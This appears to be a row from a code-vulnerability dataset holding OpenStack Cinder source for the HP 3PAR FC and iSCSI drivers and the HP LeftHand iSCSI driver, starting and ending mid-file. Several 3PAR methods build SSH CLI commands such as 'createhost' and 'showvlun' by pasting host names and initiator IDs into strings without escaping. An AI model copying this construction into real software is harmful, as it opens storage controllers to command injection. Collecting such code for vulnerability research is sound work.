            cliq_args['size'] = '100MB'
        else:
            cliq_args['size'] = '%sGB' % volume['size']

        self._cliq_run_xml(""createVolume"", cliq_args)

        volume_info = self._cliq_get_volume_info(volume['name'])
        cluster_name = volume_info['volume.clusterName']
        iscsi_iqn = volume_info['volume.iscsiIqn']

        #TODO(justinsb): Is this always 1? Does it matter?
        cluster_interface = '1'

        if not self.cluster_vip:
            self.cluster_vip = self._cliq_get_cluster_vip(cluster_name)
        iscsi_portal = self.cluster_vip + "":3260,"" + cluster_interface

        model_update = {}

        # NOTE(jdg): LH volumes always at lun 0 ?
        model_update['provider_location'] = (""%s %s %s"" %
                                             (iscsi_portal,
                                              iscsi_iqn,
                                              0))

        return model_update

    def create_volume_from_snapshot(self, volume, snapshot):
        """"""Creates a volume from a snapshot.""""""
        raise NotImplementedError()

    def create_snapshot(self, snapshot):
        """"""Creates a snapshot.""""""
        raise NotImplementedError()

    def delete_volume(self, volume):
        """"""Deletes a volume.""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['prompt'] = 'false'  # Don't confirm
        try:
            volume_info = self._cliq_get_volume_info(volume['name'])
        except exception.ProcessExecutionError:
            LOG.error(""Volume did not exist. It will not be deleted"")
            return
        self._cliq_run_xml(""deleteVolume"", cliq_args)

    def local_path(self, volume):
        msg = _(""local_path not supported"")
        raise exception.VolumeBackendAPIException(data=msg)

    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host. HP VSA requires a volume to be assigned
        to a server.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        """"""
        self._create_server(connector)
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml(""assignVolumeToServer"", cliq_args)

        iscsi_properties = self._get_iscsi_properties(volume)
        return {
            'driver_volume_type': 'iscsi',
            'data': iscsi_properties
        }

    def _create_server(self, connector):
        cliq_args = {}
        cliq_args['serverName'] = connector['host']
        out = self._cliq_run_xml(""getServerInfo"", cliq_args, False)
        response = out.find(""response"")
        result = response.attrib.get(""result"")
        if result != '0':
            cliq_args = {}
            cliq_args['serverName'] = connector['host']
            cliq_args['initiator'] = connector['initiator']
            self._cliq_run_xml(""createServer"", cliq_args)

    def terminate_connection(self, volume, connector, **kwargs):
        """"""Unassign the volume from the host.""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml(""unassignVolumeToServer"", cliq_args)

    def get_volume_stats(self, refresh):
        if refresh:
            self._update_backend_status()

        return self.device_stats

    def _update_backend_status(self):
        data = {}
        backend_name = self.configuration.safe_get('volume_backend_name')
        data['volume_backend_name'] = backend_name or self.__class__.__name__
        data['driver_version'] = '1.0'
        data['reserved_percentage'] = 0
        data['storage_protocol'] = 'iSCSI'
        data['vendor_name'] = 'Hewlett-Packard'

        result_xml = self._cliq_run_xml(""getClusterInfo"", {})
        cluster_node = result_xml.find(""response/cluster"")
        total_capacity = cluster_node.attrib.get(""spaceTotal"")
        free_capacity = cluster_node.attrib.get(""unprovisionedSpace"")
        GB = 1073741824

        data['total_capacity_gb'] = int(total_capacity) / GB
        data['free_capacity_gb'] = int(free_capacity) / GB
        self.device_stats = data
/n/n/n",0
77,77,c55589b131828f3a595903f6796cb2d0babb772f,"/cinder/volume/drivers/san/hp/hp_3par_fc.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR Fibre Channel Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_fc.HP3PARFCDriver
""""""

from hp3parclient import exceptions as hpexceptions
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)


class HP3PARFCDriver(cinder.volume.driver.FibreChannelDriver):
    """"""OpenStack Fibre Channel driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware,
              copy volume <--> Image.
    """"""

    def __init__(self, *args, **kwargs):
        super(HP3PARFCDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """"""Sanity check to ensure we have required options set.""""""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password',
                          'san_ip', 'san_login', 'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'FC'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()
        self.common.do_setup(context)

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()
        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """"""
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        The  driver returns a driver_volume_type of 'fibre_channel'.
        The target_wwn can be a single entry or a list of wwns that
        correspond to the list of remote wwn(s) that will export the volume.
        Example return values:

            {
                'driver_volume_type': 'fibre_channel'
                'data': {
                    'target_discovered': True,
                    'target_lun': 1,
                    'target_wwn': '1234567890123',
                }
            }

            or

             {
                'driver_volume_type': 'fibre_channel'
                'data': {
                    'target_discovered': True,
                    'target_lun': 1,
                    'target_wwn': ['1234567890123', '0987654321321'],
                }
            }


        Steps to export a volume on 3PAR
          * Create a host on the 3par with the target wwn
          * Create a VLUN for that HOST with the volume we want to export.

        """"""
        self.common.client_login()
        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        ports = self.common.get_ports()

        self.common.client_logout()
        info = {'driver_volume_type': 'fibre_channel',
                'data': {'target_lun': vlun['lun'],
                         'target_discovered': True,
                         'target_wwn': ports['FC']}}
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """"""Driver entry point to unattach a volume from an instance.""""""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['wwpns'])
        self.common.client_logout()

    def _create_3par_fibrechan_host(self, hostname, wwn, domain, persona_id):
        """"""Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same wwn but with a different hostname, return the hostname
        used by 3PAR.
        """"""
        out = self.common._cli_run('createhost -persona %s -domain %s %s %s'
                                   % (persona_id, domain,
                                      hostname, "" "".join(wwn)), None)
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)

        return hostname

    def _modify_3par_fibrechan_host(self, hostname, wwn):
        # when using -add, you can not send the persona or domain options
        out = self.common._cli_run('createhost -add %s %s'
                                   % (hostname, "" "".join(wwn)), None)

    def _create_host(self, volume, connector):
        """"""Creates or modifies existing 3PAR host.""""""
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['FCPaths']:
                self._modify_3par_fibrechan_host(hostname, connector['wwpns'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound as ex:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_fibrechan_host(hostname,
                                                        connector['wwpns'],
                                                        domain,
                                                        persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)
/n/n/n/cinder/volume/drivers/san/hp/hp_3par_iscsi.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR iSCSI Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_iscsi.HP3PARISCSIDriver
""""""

import sys

from hp3parclient import exceptions as hpexceptions

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)
DEFAULT_ISCSI_PORT = 3260


class HP3PARISCSIDriver(cinder.volume.driver.ISCSIDriver):
    """"""OpenStack iSCSI driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware.

    """"""
    def __init__(self, *args, **kwargs):
        super(HP3PARISCSIDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """"""Sanity check to ensure we have required options set.""""""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password', 'san_ip', 'san_login',
                          'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'iSCSI'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()

        # map iscsi_ip-> ip_port
        #             -> iqn
        #             -> nsp
        self.iscsi_ips = {}
        temp_iscsi_ip = {}

        # use the 3PAR ip_addr list for iSCSI configuration
        if len(self.configuration.hp3par_iscsi_ips) > 0:
            # add port values to ip_addr, if necessary
            for ip_addr in self.configuration.hp3par_iscsi_ips:
                ip = ip_addr.split(':')
                if len(ip) == 1:
                    temp_iscsi_ip[ip_addr] = {'ip_port': DEFAULT_ISCSI_PORT}
                elif len(ip) == 2:
                    temp_iscsi_ip[ip[0]] = {'ip_port': ip[1]}
                else:
                    msg = _(""Invalid IP address format '%s'"") % ip_addr
                    LOG.warn(msg)

        # add the single value iscsi_ip_address option to the IP dictionary.
        # This way we can see if it's a valid iSCSI IP. If it's not valid,
        # we won't use it and won't bother to report it, see below
        if (self.configuration.iscsi_ip_address not in temp_iscsi_ip):
            ip = self.configuration.iscsi_ip_address
            ip_port = self.configuration.iscsi_port
            temp_iscsi_ip[ip] = {'ip_port': ip_port}

        # get all the valid iSCSI ports from 3PAR
        # when found, add the valid iSCSI ip, ip port, iqn and nsp
        # to the iSCSI IP dictionary
        # ...this will also make sure ssh works.
        iscsi_ports = self.common.get_ports()['iSCSI']
        for (ip, iscsi_info) in iscsi_ports.iteritems():
            if ip in temp_iscsi_ip:
                ip_port = temp_iscsi_ip[ip]['ip_port']
                self.iscsi_ips[ip] = {'ip_port': ip_port,
                                      'nsp': iscsi_info['nsp'],
                                      'iqn': iscsi_info['iqn']
                                      }
                del temp_iscsi_ip[ip]

        # if the single value iscsi_ip_address option is still in the
        # temp dictionary it's because it defaults to $my_ip which doesn't
        # make sense in this context. So, if present, remove it and move on.
        if (self.configuration.iscsi_ip_address in temp_iscsi_ip):
            del temp_iscsi_ip[self.configuration.iscsi_ip_address]

        # lets see if there are invalid iSCSI IPs left in the temp dict
        if len(temp_iscsi_ip) > 0:
            msg = _(""Found invalid iSCSI IP address(s) in configuration ""
                    ""option(s) hp3par_iscsi_ips or iscsi_ip_address '%s.'"") % \
                   ("", "".join(temp_iscsi_ip))
            LOG.warn(msg)

        if not len(self.iscsi_ips) > 0:
            msg = _('At least one valid iSCSI IP address must be set.')
            raise exception.InvalidInput(reason=(msg))

        self.common.do_setup(context)

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()

        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        """"""Clone an existing volume.""""""
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()

        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """"""
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        Steps to export a volume on 3PAR
          * Get the 3PAR iSCSI iqn
          * Create a host on the 3par
          * create vlun on the 3par
        """"""
        self.common.client_login()

        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        self.common.client_logout()

        iscsi_ip = self._get_iscsi_ip(host['name'])
        iscsi_ip_port = self.iscsi_ips[iscsi_ip]['ip_port']
        iscsi_target_iqn = self.iscsi_ips[iscsi_ip]['iqn']
        info = {'driver_volume_type': 'iscsi',
                'data': {'target_portal': ""%s:%s"" %
                         (iscsi_ip, iscsi_ip_port),
                         'target_iqn': iscsi_target_iqn,
                         'target_lun': vlun['lun'],
                         'target_discovered': True
                         }
                }
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """"""Driver entry point to unattach a volume from an instance.""""""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['initiator'])
        self.common.client_logout()

    def _create_3par_iscsi_host(self, hostname, iscsi_iqn, domain, persona_id):
        """"""Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same iqn but with a different hostname, return the hostname
        used by 3PAR.
        """"""
        cmd = 'createhost -iscsi -persona %s -domain %s %s %s' % \
              (persona_id, domain, hostname, iscsi_iqn)
        out = self.common._cli_run(cmd, None)
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)
        return hostname

    def _modify_3par_iscsi_host(self, hostname, iscsi_iqn):
        # when using -add, you can not send the persona or domain options
        self.common._cli_run('createhost -iscsi -add %s %s'
                             % (hostname, iscsi_iqn), None)

    def _create_host(self, volume, connector):
        """"""Creates or modifies existing 3PAR host.""""""
        # make sure we don't have the host already
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['iSCSIPaths']:
                self._modify_3par_iscsi_host(hostname, connector['initiator'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_iscsi_host(hostname,
                                                    connector['initiator'],
                                                    domain,
                                                    persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def _get_iscsi_ip(self, hostname):
        """"""Get an iSCSI IP address to use.

        Steps to determine which IP address to use.
          * If only one IP address, return it
          * If there is an active vlun, return the IP associated with it
          * Return IP with fewest active vluns
        """"""
        if len(self.iscsi_ips) == 1:
            return self.iscsi_ips.keys()[0]

        # if we currently have an active port, use it
        nsp = self._get_active_nsp(hostname)

        if nsp is None:
            # no active vlun, find least busy port
            nsp = self._get_least_used_nsp(self._get_iscsi_nsps())
            if nsp is None:
                msg = _(""Least busy iSCSI port not found, ""
                        ""using first iSCSI port in list."")
                LOG.warn(msg)
                return self.iscsi_ips.keys()[0]

        return self._get_ip_using_nsp(nsp)

    def _get_iscsi_nsps(self):
        """"""Return the list of candidate nsps.""""""
        nsps = []
        for value in self.iscsi_ips.values():
            nsps.append(value['nsp'])
        return nsps

    def _get_ip_using_nsp(self, nsp):
        """"""Return IP assiciated with given nsp.""""""
        for (key, value) in self.iscsi_ips.items():
            if value['nsp'] == nsp:
                return key

    def _get_active_nsp(self, hostname):
        """"""Return the active nsp, if one exists, for the given host.""""""
        result = self.common._cli_run('showvlun -a -host %s' % hostname, None)
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                info = line.split("","")
                if info and len(info) > 4:
                    return info[4]

    def _get_least_used_nsp(self, nspss):
        """"""""Return the nsp that has the fewest active vluns.""""""
        # return only the nsp (node:server:port)
        result = self.common._cli_run('showvlun -a -showcols Port', None)

        # count the number of nsps (there is 1 for each active vlun)
        nsp_counts = {}
        for nsp in nspss:
            # initialize counts to zero
            nsp_counts[nsp] = 0

        current_least_used_nsp = None
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                nsp = line.strip()
                if nsp in nsp_counts:
                    nsp_counts[nsp] = nsp_counts[nsp] + 1

            # identify key (nsp) of least used nsp
            current_smallest_count = sys.maxint
            for (nsp, count) in nsp_counts.iteritems():
                if count < current_smallest_count:
                    current_least_used_nsp = nsp
                    current_smallest_count = count

        return current_least_used_nsp

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)
/n/n/n/cinder/volume/drivers/san/hp_lefthand.py/n/n#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
""""""
HP Lefthand SAN ISCSI Driver.

The driver communicates to the backend aka Cliq via SSH to perform all the
operations on the SAN.
""""""
from lxml import etree

from cinder import exception
from cinder.openstack.common import log as logging
from cinder.volume.drivers.san.san import SanISCSIDriver


LOG = logging.getLogger(__name__)


class HpSanISCSIDriver(SanISCSIDriver):
    """"""Executes commands relating to HP/Lefthand SAN ISCSI volumes.

    We use the CLIQ interface, over SSH.

    Rough overview of CLIQ commands used:

    :createVolume:    (creates the volume)

    :getVolumeInfo:    (to discover the IQN etc)

    :getClusterInfo:    (to discover the iSCSI target IP address)

    :assignVolumeChap:    (exports it with CHAP security)

    The 'trick' here is that the HP SAN enforces security by default, so
    normally a volume mount would need both to configure the SAN in the volume
    layer and do the mount on the compute layer.  Multi-layer operations are
    not catered for at the moment in the cinder architecture, so instead we
    share the volume using CHAP at volume creation time.  Then the mount need
    only use those CHAP credentials, so can take place exclusively in the
    compute layer.
    """"""

    device_stats = {}

    def __init__(self, *args, **kwargs):
        super(HpSanISCSIDriver, self).__init__(*args, **kwargs)
        self.cluster_vip = None

    def _cliq_run(self, verb, cliq_args, check_exit_code=True):
        """"""Runs a CLIQ command over SSH, without doing any result parsing""""""
        cliq_arg_strings = []
        for k, v in cliq_args.items():
            cliq_arg_strings.append("" %s=%s"" % (k, v))
        cmd = verb + ''.join(cliq_arg_strings)

        return self._run_ssh(cmd, check_exit_code)

    def _cliq_run_xml(self, verb, cliq_args, check_cliq_result=True):
        """"""Runs a CLIQ command over SSH, parsing and checking the output""""""
        cliq_args['output'] = 'XML'
        (out, _err) = self._cliq_run(verb, cliq_args, check_cliq_result)

        LOG.debug(_(""CLIQ command returned %s""), out)

        result_xml = etree.fromstring(out)
        if check_cliq_result:
            response_node = result_xml.find(""response"")
            if response_node is None:
                msg = (_(""Malformed response to CLIQ command ""
                         ""%(verb)s %(cliq_args)s. Result=%(out)s"") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

            result_code = response_node.attrib.get(""result"")

            if result_code != ""0"":
                msg = (_(""Error running CLIQ command %(verb)s %(cliq_args)s. ""
                         "" Result=%(out)s"") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

        return result_xml

    def _cliq_get_cluster_info(self, cluster_name):
        """"""Queries for info about the cluster (including IP)""""""
        cliq_args = {}
        cliq_args['clusterName'] = cluster_name
        cliq_args['searchDepth'] = '1'
        cliq_args['verbose'] = '0'

        result_xml = self._cliq_run_xml(""getClusterInfo"", cliq_args)

        return result_xml

    def _cliq_get_cluster_vip(self, cluster_name):
        """"""Gets the IP on which a cluster shares iSCSI volumes""""""
        cluster_xml = self._cliq_get_cluster_info(cluster_name)

        vips = []
        for vip in cluster_xml.findall(""response/cluster/vip""):
            vips.append(vip.attrib.get('ipAddress'))

        if len(vips) == 1:
            return vips[0]

        _xml = etree.tostring(cluster_xml)
        msg = (_(""Unexpected number of virtual ips for cluster ""
                 "" %(cluster_name)s. Result=%(_xml)s"") %
               {'cluster_name': cluster_name, '_xml': _xml})
        raise exception.VolumeBackendAPIException(data=msg)

    def _cliq_get_volume_info(self, volume_name):
        """"""Gets the volume info, including IQN""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume_name
        result_xml = self._cliq_run_xml(""getVolumeInfo"", cliq_args)

        # Result looks like this:
        #<gauche version=""1.0"">
        #  <response description=""Operation succeeded."" name=""CliqSuccess""
        #            processingTime=""87"" result=""0"">
        #    <volume autogrowPages=""4"" availability=""online"" blockSize=""1024""
        #       bytesWritten=""0"" checkSum=""false"" clusterName=""Cluster01""
        #       created=""2011-02-08T19:56:53Z"" deleting=""false"" description=""""
        #       groupName=""Group01"" initialQuota=""536870912"" isPrimary=""true""
        #       iscsiIqn=""iqn.2003-10.com.lefthandnetworks:group01:25366:vol-b""
        #       maxSize=""6865387257856"" md5=""9fa5c8b2cca54b2948a63d833097e1ca""
        #       minReplication=""1"" name=""vol-b"" parity=""0"" replication=""2""
        #       reserveQuota=""536870912"" scratchQuota=""4194304""
        #       serialNumber=""9fa5c8b2cca54b2948a63d833097e1ca0000000000006316""
        #       size=""1073741824"" stridePages=""32"" thinProvision=""true"">
        #      <status description=""OK"" value=""2""/>
        #      <permission access=""rw""
        #            authGroup=""api-34281B815713B78-(trimmed)51ADD4B7030853AA7""
        #            chapName=""chapusername"" chapRequired=""true"" id=""25369""
        #            initiatorSecret="""" iqn="""" iscsiEnabled=""true""
        #            loadBalance=""true"" targetSecret=""supersecret""/>
        #    </volume>
        #  </response>
        #</gauche>

        # Flatten the nodes into a dictionary; use prefixes to avoid collisions
        volume_attributes = {}

        volume_node = result_xml.find(""response/volume"")
        for k, v in volume_node.attrib.items():
            volume_attributes[""volume."" + k] = v

        status_node = volume_node.find(""status"")
        if status_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes[""status."" + k] = v

        # We only consider the first permission node
        permission_node = volume_node.find(""permission"")
        if permission_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes[""permission."" + k] = v

        LOG.debug(_(""Volume info: %(volume_name)s => %(volume_attributes)s"") %
                  {'volume_name': volume_name,
                   'volume_attributes': volume_attributes})
        return volume_attributes

    def create_volume(self, volume):
        """"""Creates a volume.""""""
        cliq_args = {}
        cliq_args['clusterName'] = self.configuration.san_clustername

        if self.configuration.san_thin_provision:
            cliq_args['thinProvision'] = '1'
        else:
            cliq_args['thinProvision'] = '0'

        cliq_args['volumeName'] = volume['name']
        if int(volume['size']) == 0:
            cliq_args['size'] = '100MB'
        else:
            cliq_args['size'] = '%sGB' % volume['size']

        self._cliq_run_xml(""createVolume"", cliq_args)

        volume_info = self._cliq_get_volume_info(volume['name'])
        cluster_name = volume_info['volume.clusterName']
        iscsi_iqn = volume_info['volume.iscsiIqn']

        #TODO(justinsb): Is this always 1? Does it matter?
        cluster_interface = '1'

        if not self.cluster_vip:
            self.cluster_vip = self._cliq_get_cluster_vip(cluster_name)
        iscsi_portal = self.cluster_vip + "":3260,"" + cluster_interface

        model_update = {}

        # NOTE(jdg): LH volumes always at lun 0 ?
        model_update['provider_location'] = (""%s %s %s"" %
                                             (iscsi_portal,
                                              iscsi_iqn,
                                              0))

        return model_update

    def create_volume_from_snapshot(self, volume, snapshot):
        """"""Creates a volume from a snapshot.""""""
        raise NotImplementedError()

    def create_snapshot(self, snapshot):
        """"""Creates a snapshot.""""""
        raise NotImplementedError()

    def delete_volume(self, volume):
        """"""Deletes a volume.""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['prompt'] = 'false'  # Don't confirm
        try:
            volume_info = self._cliq_get_volume_info(volume['name'])
        except exception.ProcessExecutionError:
            LOG.error(""Volume did not exist. It will not be deleted"")
            return
        self._cliq_run_xml(""deleteVolume"", cliq_args)

    def local_path(self, volume):
        msg = _(""local_path not supported"")
        raise exception.VolumeBackendAPIException(data=msg)

    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host. HP VSA requires a volume to be assigned
        to a server.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        """"""
        self._create_server(connector)
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml(""assignVolumeToServer"", cliq_args)

        iscsi_properties = self._get_iscsi_properties(volume)
        return {
            'driver_volume_type': 'iscsi',
            'data': iscsi_properties
        }

    def _create_server(self, connector):
